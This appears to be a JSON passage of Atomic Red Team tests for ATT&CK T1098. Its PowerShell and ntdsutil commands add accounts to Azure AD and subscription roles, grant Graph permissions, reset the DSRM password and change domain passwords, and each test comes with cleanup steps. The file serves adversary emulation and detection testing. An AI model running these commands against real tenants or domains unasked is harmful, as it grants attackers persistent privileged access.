			"cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore\n\n$user = Get-AzureADUser -Filter \"DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was removed from $($role.DisplayName) role\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Azure AD - adding service principal to Azure AD role",
		"auto_generated_guid": "92c40b3f-c406-4d1f-8d2b-c039bf5009e4",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "p4sswd"
			},
			"service_principal_name": {
				"description": "Name of the service principal",
				"type": "string",
				"default": "SuperSP"
			},
			"role_name": {
				"description": "Name of the targeted Azure AD role",
				"type": "string",
				"default": "Global Reader"
			}
		},
		"dependencies": [
			{
				"description": "AzureAD module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq '#{service_principal_name}'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\"\n",
			"cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq '#{service_principal_name}'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Azure - adding user to Azure role in subscription",
		"auto_generated_guid": "1a94b3fc-b080-450a-b3d8-6d9b57b472ea",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "p4sswd"
			},
			"user_principal_name": {
				"description": "Display Name, or User Principal Name, of the targeted user principal",
				"type": "string",
				"default": "SuperUser"
			},
			"role_name": {
				"description": "Name of the targeted Azure role",
				"type": "string",
				"default": "Reader"
			},
			"subscription": {
				"description": "Name of the targeted subscription",
				"type": "string",
				"default": "Azure subscription 1"
			}
		},
		"dependencies": [
			{
				"description": "Az.Resources module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name Az.Resources -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\" -or $_.UserPrincipalName -eq \"#{user_principal_name}\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n",
			"cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction Ignore\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\" -or $_.UserPrincipalName -eq \"#{user_principal_name}\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Azure - adding service principal to Azure role in subscription",
		"auto_generated_guid": "c8f4bc29-a151-48da-b3be-4680af56f404",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "p4sswd"
			},
			"service_principal_name": {
				"description": "Name of the service principal",
				"type": "string",
				"default": "SuperSP"
			},
			"role_name": {
				"description": "Name of the targeted Azure role",
				"type": "string",
				"default": "Reader"
			},
			"subscription": {
				"description": "Name of the targeted subscription",
				"type": "string",
				"default": "Azure subscription 1"
			}
		},
		"dependencies": [
			{
				"description": "Az.Resources module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name Az.Resources -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n",
			"cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction Ignore\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Azure AD - adding permission to application",
		"auto_generated_guid": "94ea9cc3-81f9-4111-8dde-3fb54f36af4b",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "p4sswd"
			},
			"application_name": {
				"description": "Name of the targeted application that will be created",
				"type": "string",
				"default": "test_app"
			},
			"application_permission": {
				"description": "Permission from Microsoft Graph Resource API that will be added to application",
				"type": "string",
				"default": "DirectoryRecommendations.Read.All"
			}
		},
		"dependencies": [
			{
				"description": "AzureAD module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n",
			"cleanup_command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\")\nIf ($aadApplication.Count -eq 0)\n{\n  Write-Host \"App not found: cannot delete it\"\n  exit\n}\nElseIf ($aadApplication.Count -gt 1)\n{\n  Write-Host \"Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.\"\n  exit\n}\nElse\n{\n  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId\n  Write-Host \"Successfully deleted app\"\n}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Password Change on Directory Service Restore Mode (DSRM) Account",
		"auto_generated_guid": "d5b886d9-d1c7-4b6e-a7b0-460041bf2823",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"sync_account": {
				"description": "Account to sync password from",
				"type": "string",
				"default": "%username%"
			}
		},
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "ntdsutil \"set dsrm password\" \"sync from domain account #{sync_account}\" \"q\" \"q\"\n"
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Domain Password Policy Check: Short Password",
		"auto_generated_guid": "fc5f9414-bd67-4f5f-a08e-e5381e29cbd1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_password": {
				"description": "The password to set for the current domain user (default value is 7 characters)",
				"type": "string",
				"default": "Uplow-1"
			},
			"cred_file": {
				"description": "A file containing the password of the current user",
				"type": "path",
				"default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"
			}
		},
		"dependencies": [
			{
				"description": "Password for current user must be stored in a credential file\n",
				"prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Domain Password Policy Check: No Number in Password",
		"auto_generated_guid": "68190529-069b-4ffc-a942-919704158065",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_password": {
				"description": "The password to set for the current domain user (default is long and has upper and lower case and special character but no number)",
				"type": "string",
				"default": "UpperLowerLong-special"
			},
			"cred_file": {
				"description": "A file containing the password of the current user",
				"type": "path",
				"default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"
			}
		},
		"dependencies": [
			{
				"description": "Password for current user must be stored in a credential file\n",
				"prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Domain Password Policy Check: No Special Character in Password",
		"auto_generated_guid": "7d984ef2-2db2-4cec-b090-e637e1698f61",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_password": {
				"description": "The password to set for the current domain user (default is long and has upper and lower case and number but no special character)",
				"type": "string",
				"default": "UpperLowerLong333noSpecialChar"
			},
			"cred_file": {
				"description": "A file containing the password of the current user",
				"type": "path",
				"default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"
			}
		},
		"dependencies": [
			{
				"description": "Password for current user must be stored in a credential file\n",
				"prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Domain Password Policy Check: No Uppercase Character in Password",
		"auto_generated_guid": "b299c120-44a7-4d68-b8e2-8ba5a28511ec",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_password": {
				"description": "The password to set for the current domain user (default is long and has and lower case and special character and number but no uppercase)",
				"type": "string",
				"default": "lower-long-special-333"
			},
			"cred_file": {
				"description": "A file containing the password of the current user",
				"type": "path",
				"default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"
			}
		},
		"dependencies": [
			{
				"description": "Password for current user must be stored in a credential file\n",
				"prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Domain Password Policy Check: No Lowercase Character in Password",
		"auto_generated_guid": "945da11e-977e-4dab-85d2-f394d03c5887",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_password": {
				"description": "The password to set for the current domain user (default is long and has and upper case and special character and number but no lowercase)",
				"type": "string",
				"default": "UPPER-LONG-SPECIAL-333"
			},
			"cred_file": {
				"description": "A file containing the password of the current user",
				"type": "path",
				"default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"
			}
		},
		"dependencies": [
			{
				"description": "Password for current user must be stored in a credential file\n",
				"prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Domain Password Policy Check: Only Two Character Classes",
		"auto_generated_guid": "784d1349-5a26-4d20-af5e-d6af53bae460",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_password": {
				"description": "The password to set for the current domain user (default has only upper and lower case characters)",
				"type": "string",
				"default": "onlyUPandLowChars"
			},
			"cred_file": {
				"description": "A file containing the password of the current user",
				"type": "path",
				"default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"
			}
		},
		"dependencies": [
			{
				"description": "Password for current user must be stored in a credential file\n",
				"prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Domain Password Policy Check: Common Password Use",
		"auto_generated_guid": "81959d03-c51f-49a1-bb24-23f1ec885578",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_password": {
				"description": "The password to set for the current domain user (default is Season and current year combo)",
				"type": "string",
				"default": "Spring$((Get-Date).Year)!"
			},
			"cred_file": {
				"description": "A file containing the password of the current user",
				"type": "path",
				"default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"
			}
		},
		"dependencies": [
			{
				"description": "Password for current user must be stored in a credential file\n",
				"prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
